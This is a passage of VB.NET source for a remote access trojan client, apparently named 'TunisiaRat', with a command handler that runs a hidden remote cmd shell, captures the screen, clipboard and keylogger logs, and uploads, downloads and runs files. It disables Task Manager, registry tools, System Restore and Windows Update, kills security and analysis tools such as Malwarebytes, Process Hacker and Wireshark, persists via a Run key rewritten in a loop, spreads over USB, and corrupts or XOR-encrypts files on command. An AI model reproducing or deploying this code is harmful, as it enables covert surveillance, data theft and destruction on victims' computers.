                Case "showtb"
                    Dim TaskbarHandle As Long
                    TaskbarHandle = FindWindow("Shell_traywnd", "")
                    SetWindowPos(TaskbarHandle, 0&, 0&, 0&, 0&, 0&, TASKBAR_SHOW)
                Case "winupdateon"
                    Dim ss As Boolean
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWindowsUpdate", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "winupdateoff"
                    Dim dis As Boolean
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWindowsUpdate", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableCMD" 'Coded By ShadowTech coder
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableCMD" 'Coded By ShadowTech coder
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableRegistry" 'Coded By ShadowTech coder
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableRegistry" 'Coded By ShadowTech coder
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableRestore" 'Coded By ShadowTech coder
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableRestore" 'Coded By ShadowTech coder
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableTaskManager" 'Coded By ShadowTech coder
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableTaskManager" 'Coded By ShadowTech coder
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "TurnOffMonitor" 'Coded By ShadowTech coder
                    SendMessage(-1, &H112, &HF170, 2)
                Case "TurnOnMonitor" 'Coded By ShadowTech coder
                    SendMessage(-1, &H112, &HF170, -1)
                Case "NormalMouse" 'Coded By ShadowTech coder
                    SwapMouseButton(&H0&)
                Case "ReverseMouse" 'Coded By ShadowTech coder
                    SwapMouseButton(&H100&)
                Case "opencd"
                    Try
                        mciSendString("set cdaudio door open", 0, 0, 0)
                    Catch ex As Exception
                    End Try
                Case "closecd"
                    Try
                        mciSendString("set cdaudio door closed", 0, 0, 0)
                    Catch ex As Exception
                    End Try
                Case "sendinformation"
                    Dim time, h, m, s As Integer
                    time = My.Computer.Clock.TickCount
                    h = time \ 3600000
                    m = (time Mod 3600000) \ 60000
                    s = ((time Mod 3600000) Mod 60000) / 1000
                    Dim ab, bb, cb, db, eb, fb, gb As String
                    ab = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "")
                    bb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "Identifier", "")
                    cb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName", "")
                    db = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSReleaseDate", "")
                    eb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVersion", "")
                    fb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer", "")
                    gb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVendor", "")
                    Dim value As String = Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER\TunisiaRat", "ID", "")
                    C.Send("sendinformation" & Yy & Environment.MachineName & Yy & Environment.UserName & Yy & My.Computer.Info.OSFullName & Yy & My.Computer.Info.OSPlatform & Yy & country & Yy & getanti() & Yy & GetSystemRAMSize() & Yy & "0.1.0" & Yy & checkcam() & Yy & ACT() & Yy & My.Computer.Clock.LocalTime & Yy & h & ":" & m & ":" & s & Yy & Environment.CurrentDirectory & Yy & Environment.SystemDirectory & Yy & Environment.UserDomainName & Yy & Environment.UserInteractive & Yy & Environment.WorkingSet & Yy & My.Computer.Info.OSVersion & Yy & My.Computer.Info.InstalledUICulture.ToString & Yy & System.Environment.CommandLine & Yy & port & Yy & Application.ExecutablePath & Yy & ab & Yy & bb & Yy & cb & Yy & db & Yy & eb & Yy & fb & Yy & gb & Yy & value)
                Case "infoDesk"
                    Dim m As Image = CaptureDesktop()
                    Dim cc As New ImageConverter
                    Dim bb As Byte() = cc.ConvertTo(m, b.GetType)
                    C.Send("infoDesk" & "|U|" & Convert.ToBase64String(bb) & "|U|" & name & "|U|" & port & "|U|" & Ver & "|U|" & GetFirewall() & "|U|" & Application.ExecutablePath)
                Case "clipss"
                    C.Send("clipss" & Yy & Npc)
                Case "getcli"
                    Invoke(New gt(AddressOf gtx))
                Case "openRG"
                    C.Send("openRG")
                Case "RG" ' Registry 
                    Dim kk As Object = GetKey(A(2))
                    Select Case A(1)
                        Case "~" ' send keys under key+ send values 
                            Dim s As String = "RG" & Yy & "~" & Yy & A(2) & Yy
                            Dim o As String = ""
                            For Each xe As String In kk.GetSubKeyNames
                                If xe.Contains("\") = False Then
                                    o += xe & Yy
                                End If
                            Next
                            For Each xs As String In kk.GetValueNames
                                o += xs & "/" & kk.GetValueKind(xs).ToString & "/" & kk.GetValue(xs, "").ToString & Yy
                            Next
                            C.Send(s & o)
                        Case "!" ' Set Value
                            kk.SetValue(A(3), A(4), A(5))
                        Case "@5" ' delete value
                            kk.DeleteValue(A(3), False)
                        Case "#" ' creat key
                            kk.CreateSubKey(A(3))
                        Case "$" ' delete key
                            kk.DeleteSubKeyTree(A(3))
                    End Select
                Case "openshell" ' start remote shell
                    Try
                        Pro.Kill()
                    Catch ex As Exception
                    End Try
                    Pro = New Process
                    Pro.StartInfo.RedirectStandardOutput = True
                    Pro.StartInfo.RedirectStandardInput = True
                    Pro.StartInfo.RedirectStandardError = True
                    Pro.StartInfo.FileName = "cmd.exe"
                    Pro.StartInfo.RedirectStandardError = True
                    AddHandler CType(Pro, Process).OutputDataReceived, AddressOf RS
                    AddHandler CType(Pro, Process).ErrorDataReceived, AddressOf RS
                    AddHandler CType(Pro, Process).Exited, AddressOf ex
                    Pro.StartInfo.UseShellExecute = False
                    Pro.StartInfo.CreateNoWindow = True
                    Pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    Pro.EnableRaisingEvents = True
                    C.Send("openshell")
                    Pro.Start()
                    Pro.BeginErrorReadLine()
                    Pro.BeginOutputReadLine()
                Case "rs"
                    Pro.StandardInput.WriteLine(DEB(A(1)))
                Case "rsc"
                    Try
                        Pro.Kill()
                    Catch ex As Exception
                    End Try
                    Pro = Nothing
                Case "OpenPro"
                    C.Send("OpenPro" & Yy & Npc)
                Case "GetProcesses"
                    Dim allProcess As String = ""
                    Dim sl As String = "ProcessSplit"
                    For Each xd As Process In Process.GetProcesses
                        Try
                            allProcess += xd.ProcessName & "|" & xd.Id & "|" & xd.MainModule.FileName & "|" & xd.PrivateMemorySize64 & "|" & xd.StartTime & sl
                        Catch
                            allProcess += xd.ProcessName & "|" & xd.Id & "|" & "-" & "|" & xd.PrivateMemorySize64 & "|" & "-" & sl
                        End Try
                    Next
                    C.Send("ProcessManager" & Yy & allProcess & Yy & System.IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))
                Case "KillProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
                            RunningProcess.Kill()
                        Next
                    Next

                Case "SProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim o = Process.GetProcessesByName(eachprocess(i))
                        SuspendProcess(o(0))
                        C.Send("SP")
                    Next

                Case "SSProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim sh = Process.GetProcessesByName(eachprocess(i))
                        Dim iHwnd As IntPtr = FindWindow(eachprocess(i), vbNullString)
                        ShowWindow(iHwnd, SW_SHOWNORMAL)
                        C.Send("SP")
                    Next
                Case "SSSProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim hi = Process.GetProcessesByName(eachprocess(i))
                        Dim iHwnd As IntPtr = FindWindow(eachprocess(i), vbNullString)
                        ShowWindow(iHwnd, SW_SHOWMINIMIZED)
                        C.Send("SP")
                    Next
                Case "viewimage"
                    C.Send("viewimage" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & Yy)
                Case "GetDrives"
                    C.Send("FileManager" & Yy & getDrives())
                Case "FileManager"
                    Try
                        C.Send("FileManager" & Yy & getFolders(A(1)) & getFiles(A(1)))
                    Catch
                        C.Send("FileManager" & Yy & "Error")
                    End Try
                Case "|||"
                    C.Send("|||")
                Case "Delete"
                    Select Case A(1)
                        Case "Folder"
                            IO.Directory.Delete(A(2))
                        Case "File"
                            IO.File.Delete(A(2))
                    End Select
                Case "Execute"
                    Process.Start(A(1))
                Case "Rename"
                    Select Case A(1)
                        Case "Folder"
                            My.Computer.FileSystem.RenameDirectory(A(2), A(3))
                        Case "File"
                            My.Computer.FileSystem.RenameFile(A(2), A(3))
                    End Select
                Case "sendfile"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))
                Case "playmusic" 'Coded By Volkano
                    My.Computer.Audio.Play(A(1), AudioPlayMode.Background)
                Case "getdesktoppath" 'Coded By Volkano
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "gettemppath" 'Coded By Volkano
                    Dim specialfolder As String
                    specialfolder = IO.Path.GetTempPath
                    C.Send("getpath" & Yy & specialfolder)
                Case "getstartuppath" 'Coded By Volkano
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "getmydocumentspath" 'Coded By Volkano
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                    C.Send("getpath" & Yy & specialfolder & "\")

                Case "cryptedecryptetextfile" 'Coded By Volkano
                    Dim R As New IO.StreamReader(A(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    Dim i As Short
                    Dim KeyChar As Integer
                    KeyChar = Asc("~!@#$%^&*()_+/*-+")
                    For i = 1 To Len(d)
                        x &= Chr(KeyChar Xor Asc(Mid(d, i, 1)))
                    Next
                    Dim C As New IO.StreamWriter(A(1))
                    C.WriteLine(x)
                    C.Close()
                Case "edittextfile" 'Coded By Volkano
                    Dim R As New IO.StreamReader(A(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    C.Send("edittextfile" & Yy & A(1) & Yy & d)
                Case "savetextfile" 'Coded By Volkano
                    Dim C As New IO.StreamWriter(A(1))
                    C.WriteLine(A(2))
                    C.Close()
                Case "creatnewtextfile" 'Coded By Volkano
                    Try
                        IO.File.Create(A(1)).Dispose()
                    Catch ex As Exception
                        C.Send("msgbox" & Yy & "Information" & Yy & "File Name Already Exists")
                    End Try
                Case "setaswallpaper" 'Coded By Volkano
                    SystemParametersInfo(SETDESKWALLPAPER, 0, A(1), UPDATEINIFILE)
                Case "sendfileto" 'Coded By Volkano
                    IO.File.WriteAllBytes(A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                Case "creatnewfolder" 'Coded By Volkano
                    Try
                        My.Computer.FileSystem.CreateDirectory _
        (A(1))

                    Catch ez As Exception
                    End Try
                Case "hidefolderfile" 'Coded By Volkano
                    Dim hiden As FileAttribute = FileAttribute.Hidden
                    Try
                        SetAttr(A(1), hiden)
                    Catch ex As Exception

                    End Try
                Case "showfolderfile" 'Coded By Volkano
                    Dim shown As FileAttribute = FileAttribute.Normal
                    Try
                        SetAttr(A(1), shown)
                    Catch ex As Exception

                    End Try
                Case "downloadfile" 'Coded By Volkano
                    C.Send("downloadedfile" & "|U|" & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & "|U|" & A(2))
                Case "corrupt" 'Coded By Volkano
                    Dim corruption As String = "wAyqsW4eE9Csd0dndY1rLnufPtO4Vjp9cRvXz0g38RaWjeoo1OBXT0CNp4wW7vY4Ti6Sm64zhnEn0QWHcVTGZrnNHcc9JFDNGAPYCzPWwyDPIDBsdg067E8newVoWRj7TON9roebC3m0iW9oGJ73CM4UelTtjctQvxt2QqpXATVVvAKpibp7qcoiRV9Vmves42mYUI42"
                    Dim R As New IO.StreamReader(A(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    My.Computer.FileSystem.WriteAllText(A(1), corruption & d, False)
                Case "tt"
                    C.Send("tt")
                Case "Upload"
                    Try
                        If File.Exists(A(1)) Then File.Delete(A(1))
                        Dim fs As New FileStream(A(1), FileMode.Create, FileAccess.Write)
                        Dim tempPacket() As Byte = SB(A(3))
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        C.Send("NextPartOfUpload" & Yy & A(2))
                    Catch
                        C.Send("UploadFailed" & Yy & A(2))
                    End Try
                Case "UploadContinue"
                    Try
A:
                        Dim fs As New FileStream(A(1), FileMode.Append, FileAccess.Write)
                        Dim tempPacket() As Byte = SB(A(3))
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        C.Send("NextPartOfUpload" & Yy & A(2))
                    Catch
                        GoTo A 'Send("UploadFailed|" & cut(2))
                    End Try
                Case "CancelUpload"
B:
                    Try
                        If File.Exists(A(1)) Then File.Delete(A(1))
                    Catch
                        GoTo B
                    End Try
                Case "info" ' server ask me what is my pc name
                    ' If A(1) = pw Then
                    Dim pc As String = Environment.MachineName & "/" & Environment.UserName
                    Dim os As String = My.Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
                    Dim cpu As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CENTRALPROCESSOR\0", "ProcessorNameString", Nothing).ToString

                    C.Send("info" & Yy & name & Yy & pc & Yy & country & Yy & os + GenerateOperatingSystem() & Yy & getanti() & Yy & checkcam() & Yy & RAM() & Yy & cpu & Yy & "0.2.6" & Yy & FR())                    ' End If
                Case "Uninstall"
                    Try
                        Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                        PersistThread.Abort() : regKey.DeleteValue(StartupKey) : regKey.Close()

                    Catch ex As Exception
                    End Try

                    Try
                        If hidme Then
                            File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal)
                        End If
                        UNS()
                    Catch : End Try

                Case "!" ' server ask for my screen Size
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    C.Send("!" & Yy & s.Width & Yy & s.Height)
                Case "!!" ' server ask for my screen Size
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    C.Send("!!" & Yy & s.Width & Yy & s.Height)
                Case "@" ' Start Capture
                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@" & Yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    C.Send(M.ToArray)
                    M.Dispose()
                Case "@@" ' Start Capture

                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = caa.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@@" & Yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    C.Send(M.ToArray)
                    M.Dispose()
                Case "#" ' mouse clicks
                    Cursor.Position = New Point(A(1), A(2))
                    mouse_event(A(3), 0, 0, 0, 1)
                Case "$" '  mouse move
                    Cursor.Position = New Point(A(1), A(2))
                Case "close"
                    End
                Case "fun"
                    C.Send("fun")
                Case "F"
                    My.Computer.FileSystem.WriteAllBytes(A(2), SB(A(1)), False)
                    Process.Start(A(2))
                    C.Send("F")
                    '    Case "logf"
                    '       C.Send("logf" & Yy & getlog(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) & Yy & Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
                    '    Case "logf"
                    '       C.Send("logf" & Yy & getlog(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) & Yy & Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
                Case "openkl"
                    C.Send("openkl")
                Case "Getloges"
                    Try
                        C.Send("loges" & Yy & kl.Logs)
                    Catch : End Try
            End Select
        Catch ex As Exception
        End Try

    End Sub
#End Region
    Private Sub SuspendProcess(ByVal process As System.Diagnostics.Process)
        For Each t As ProcessThread In process.Threads
            Dim th As IntPtr
            th = OpenThread(ThreadAccess.SUSPEND_RESUME, False, t.Id)
            If th <> IntPtr.Zero Then
                SuspendThread(th)
                CloseHandle(th)
            End If
        Next
    End Sub
#Region " =================== remote Shell =================== "



#End Region
    Public Function ENB(ByRef s As String) As String ' Encode base64
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Public Function DEB(ByRef s As String) As String ' Decode Base64
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)
    Private Sub RS(ByVal a As Object, ByVal e As Object) 'Handles k.OutputDataReceived
        Try
            C.Send("rs" & Yy & ENB(e.Data))
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ex()
        Try
            C.Send("rsc" & Yy)
        Catch ex As Exception
        End Try
    End Sub

    Function GetKey(ByVal key As String) As Microsoft.Win32.RegistryKey ' get registry Key
        Dim k As String
        If key.StartsWith(Registry.ClassesRoot.Name) Then
            k = key.Replace(Registry.ClassesRoot.Name & "\", "")
            Return Registry.ClassesRoot.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.CurrentUser.Name) Then
            k = key.Replace(Registry.CurrentUser.Name & "\", "")
            Return Registry.CurrentUser.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.LocalMachine.Name) Then
            k = key.Replace(Registry.LocalMachine.Name & "\", "")
            Return Registry.LocalMachine.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.Users.Name) Then
            k = key.Replace(Registry.Users.Name & "\", "")
            Return Registry.Users.OpenSubKey(k, True)
        End If
        Return Nothing
    End Function
    Delegate Sub gt() '----------- get text from clipborad
    Function gtx() As String '----------- get text from clipborad
        Dim str As String
        str = Windows.Forms.Clipboard.GetText
        C.Send("recvcli" & Yy & str)
        Return True
    End Function
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function

    Private Sub Timer3_Tick(sender As System.Object, e As System.EventArgs) Handles Timer3.Tick
        Dim ItemProcess() As Process = Process.GetProcessesByName("procexp")

        If Not ItemProcess Is Nothing Then

            For Each SubProcess As Process In ItemProcess

                SubProcess.Kill()

            Next
        End If
    End Sub

    Private Sub Timer4_Tick(sender As System.Object, e As System.EventArgs) Handles Timer4.Tick
        Try
            Dim ProcessHacker() As Process = Process.GetProcessesByName("ProcessHacker")

            For Each Process As Process In ProcessHacker
                Process.Kill()
            Next

        Catch x As Exception
        End Try
        Dim ItemProcess() As Process = Process.GetProcessesByName("ProcessHacker")

        If Not ItemProcess Is Nothing Then

            For Each SubProcess As Process In ItemProcess

                SubProcess.Kill()

            Next
        End If
    End Sub

    Private Sub Timer5_Tick(sender As System.Object, e As System.EventArgs) Handles Timer5.Tick
        Try
            Dim apateDNS() As Process = Process.GetProcessesByName("apateDNS")

            For Each Process As Process In apateDNS
                Process.Kill()
            Next

        Catch x As Exception
        End Try

    End Sub

    Private Sub Timer6_Tick(sender As System.Object, e As System.EventArgs) Handles Timer6.Tick
        For Each proc In System.Diagnostics.Process.GetProcessesByName("mbamgui")
            If proc.MainWindowTitle.Trim() = "Malwarebytes Anti-Malware" Then
                proc.Kill()
            End If
        Next
        Try
            Dim mbamgui() As Process = Process.GetProcessesByName("mbamgui")

            For Each Process As Process In mbamgui
                Process.Kill()
            Next

        Catch x As Exception
        End Try
        For Each proc In System.Diagnostics.Process.GetProcessesByName("mbam")
            If proc.MainWindowTitle.Trim() = "Malwarebytes Anti-Malware" Then
                proc.Kill()
            End If
        Next
        Try
            Dim mbam() As Process = Process.GetProcessesByName("mbam")

            For Each Process As Process In mbam
                Process.Kill()
            Next

        Catch x As Exception
        End Try
    End Sub

    Private Sub Timer7_Tick(sender As System.Object, e As System.EventArgs) Handles Timer7.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("AntiLogger")

            For Each Process As Process In AntiLogger
                Process.Kill()
            Next

        Catch x As Exception
        End Try

    End Sub

    Sub Persist(ByVal Skey As String)
        Do
            System.Threading.Thread.Sleep(500)
            Try
                Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                regKey.SetValue(Skey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
            Catch : End Try
        Loop
    End Sub
    Sub BA()
        Try
            Do

                Dim i As CLIENT_ID
                Dim hThread As Long
i:
                pfnStartAddr = GetProcAddress(LoadLibrary("ntdll"), "RtlExitUserProcess") 'او يمكنك استخدام ال ExitProcess مع مراعاة تغيير اسم المكتبة
                RtlCreateUserThread(Process.GetProcessesByName("sqlwriter")(0).Handle, 0&, 0, 0, 0, 0, pfnStartAddr, 0, 0, i)
                Threading.Thread.Sleep(2000)
            Loop
        Catch ex As Exception
            GoTo i
        End Try

    End Sub

    Public Sub IconsToggle()
        Dim hWnd As IntPtr = FindWindow("ProgMan", Nothing)
        hWnd = GetWindow(hWnd, GetWindowCmd.GW_CHILD)

        If IsWindowVisible(hWnd) Then
            ShowWindow(hWnd, SW.Hide)
        Else
            ShowWindow(hWnd, SW.ShowNoActivate)
        End If
    End Sub
    Private Declare Function FindWindowEx Lib "user32.dll" Alias _
"FindWindowExA" (ByVal hWnd1 As Int32, ByVal hWnd2 As Int32, ByVal lpsz1 As String, _
ByVal lpsz2 As String) As Int32 'Find Child Window Of External Window

    Private Sub HideTaskbarItems()
        Dim TaskBarWin As Long, TaskButtonWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString) 'Find Taskbar
        TaskButtonWin = FindWindowEx(TaskBarWin, 0, "ReBarWindow32", vbNullString) 'Find TaskBar Button Area
        ShowWindow(TaskButtonWin, 1) 'Show Active Buttons
    End Sub
    Private Sub ShowTaskbarItems()
        Dim TaskBarWin As Long, TaskButtonWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TaskButtonWin = FindWindowEx(TaskBarWin, 0, "ReBarWindow32", vbNullString)
        ShowWindow(TaskButtonWin, 0) 'Hide Active Buttons
    End Sub
    Private Sub hideclock()
        Dim TaskBarWin As Long, TrayWin As Long, ClockWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TrayWin = FindWindowEx(TaskBarWin, 0, "TrayNotifyWnd", vbNullString)
        ClockWin = FindWindowEx(TrayWin, 0, "TrayClockWClass", vbNullString)
        ShowWindow(ClockWin, 0) 'Hide Clock
    End Sub

    Private Sub showclock()
        Dim TaskBarWin As Long, TrayWin As Long, ClockWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString) 'Find TaskBar 
        TrayWin = FindWindowEx(TaskBarWin, 0, "TrayNotifyWnd", vbNullString) 'Find Tray Window
        ClockWin = FindWindowEx(TrayWin, 0, "TrayClockWClass", vbNullString) 'Find Clock Window
        ShowWindow(ClockWin, 1) 'Show Clock

    End Sub
    Public Sub AddHome(ByVal text As String)
        Dim key As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Internet Explorer\Main", True)
        key.SetValue("Start Page", text)
    End Sub
    Dim sf As String = "Software\Microsoft\Windows\CurrentVersion\Run"
    Sub UNS() ' Uninstall
        Dim StartupKey As String = namev
        Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
        regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.DeleteValue(namev)
        Try ' remove me from Startup Folder
            Dim e = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & RG & ".exe"
        Catch ex As Exception
        End Try
        Try ' delete My Registry Key
            Registry.CurrentUser.OpenSubKey("Software", True).DeleteSubKey(RG, False)
        Catch ex As Exception
        End Try
        Try ' Self Delete
            Shell("cmd.exe /k ping 0 & del " & ChrW(34) & LO.FullName & ChrW(34) & " & exit", AppWinStyle.Hide)
        Catch ex As Exception
        End Try
        End '<< END process
    End Sub
    Sub CreateDirectory(ByVal Path As String)
        Dim appData As String = GetFolderPath(SpecialFolder.ApplicationData)
        Directory.CreateDirectory(appData)
    End Sub
#Region "Chat System"
    Delegate Sub rv(ByVal data1 As String) '------ Recive Text from client
    Delegate Sub oc() '----------- Open Chat Form
    Delegate Sub ec() '----------- close chat form
    Sub och()
        Form3.Show()
    End Sub
    Sub cc()
        Form3.Close()
    End Sub
    Sub rvt(ByVal data1 As String)
        Form3.Recv.Text += Environment.NewLine & "Hacker : " & data1
        Form3.Recv.SelectionStart = Form3.Recv.Text.Length
        Form3.Recv.ScrollToCaret()
    End Sub
#End Region

    Private Sub Timer8_Tick(sender As Object, e As EventArgs) Handles Timer8.Tick
        Usb1.infect()
    End Sub
    Private Sub Timer9_Tick_1(sender As Object, e As EventArgs) Handles Timer9.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("SbieCtrl")
            For Each Process As Process In AntiLogger
                Process.Kill()
            Next
        Catch x As Exception
        End Try
    End Sub

    Private Sub Timer10_Tick(sender As Object, e As EventArgs) Handles Timer10.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("SpyTheSpy")
            For Each Process As Process In AntiLogger
                Process.Kill()
            Next
        Catch x As Exception
        End Try
    End Sub

    Private Sub Timer11_Tick(sender As Object, e As EventArgs) Handles Timer11.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("SpeedGear")
            For Each Process As Process In AntiLogger
                Process.Kill()
            Next
        Catch x As Exception
        End Try
    End Sub

    Private Sub Timer12_Tick(sender As Object, e As EventArgs) Handles Timer12.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("wireshark")
            For Each Process As Process In AntiLogger
                Process.Kill()
            Next
        Catch x As Exception
        End Try
    End Sub

    Private Sub Timer13_Tick(sender As Object, e As EventArgs) Handles Timer13.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("IPBlocker")
            For Each Process As Process In AntiLogger
                Process.Kill()
            Next
        Catch x As Exception
        End Try
    End Sub

    Private Sub Timer14_Tick(sender As Object, e As EventArgs) Handles Timer14.Tick
        Try
            Dim AntiLogger() As Process = Process.GetProcessesByName("cports")
            For Each Process As Process In AntiLogger
                Process.Kill()
            Next
        Catch x As Exception
        End Try
    End Sub
    Function AVG()
